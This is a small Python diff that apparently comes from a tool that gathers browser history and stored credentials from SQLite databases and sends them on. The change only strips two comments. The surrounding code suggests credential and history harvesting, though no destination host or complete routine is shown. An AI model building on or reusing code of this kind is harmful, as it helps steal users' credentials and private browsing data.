@@ -46,7 +46,7 @@ def should_send(entry, last_sent_times):
     last_time = last_sent_times.get(btype)
     current_time = entry.get("visit_time")
     if not current_time:
-        return True  # credentials have no visit_time, always send once
+        return True
     return not last_time or current_time > last_time
 
 # ========== IDENTIFIER ==========
@@ -79,7 +79,7 @@ def extract_history_from_sqlite(path, query, parse_row_fn):
         # Copy main db file
         shutil.copy2(path, temp_path)
 
-        # Copy auxiliary files if they exist (important!)
+        # Copy auxiliary files if they exist
         for ext in ["-wal", "-shm"]:
             src = path + ext
             dst = temp_path + ext
